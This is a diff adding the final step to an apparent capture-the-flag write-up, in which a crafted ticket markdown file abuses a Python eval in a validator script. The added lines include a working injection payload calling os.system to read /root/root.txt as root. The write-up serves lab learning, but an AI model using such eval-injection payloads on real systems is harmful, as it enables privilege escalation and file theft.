@@ -244,6 +244,21 @@ so i downloaded this code and created test.md file to check the valid format of 
 
 4-`Line 29` it checks if the fourth line is in or not ,if the line exist should starts with `**` and  the script removes the `**`
 
-so in the forth line we can excute code 
+so in the forth line we can excute code so upload sample of `test.md` in valid format on the server and tried to run the code 
+
+and try to  read /root/root.txt
+```
+# Skytrain Inc
+## Ticket to
+__Ticket Code:__
+**180+ 30 == 210 and __import__('os').system('cat /root/root.txt') 
+
+```
+**Finally PWN!!** 
+
+
+![Screenshot_20211012_222418](https://user-images.githubusercontent.com/36403473/142423714-9e6e8cc0-088c-4171-943f-1ed4f87de684.png)
+
+
 
 
